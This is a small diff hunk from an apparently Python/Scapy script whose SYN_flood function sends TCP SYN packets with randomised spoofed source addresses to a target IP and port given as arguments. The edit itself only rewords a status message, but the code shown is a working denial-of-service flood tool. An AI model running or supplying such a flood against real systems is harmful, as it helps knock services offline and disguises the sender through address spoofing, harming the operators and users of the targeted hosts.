@@ -88,7 +88,7 @@ def SYN_flood(Target_IP, dPort, packets_to_send):
         src_IP = random_IP()
         packet = IP(dst=Target_IP, src=src_IP)/TCP(sport=sPort, dport=dPort, flags="S", seq=seq_n, window=Window)
         send(packet, verbose=0)
-    print("Packets have been Sent...")
+    print("Packets Sent.")
 
 def main():
     Target_IP, dPort, packets_to_send = get_args()
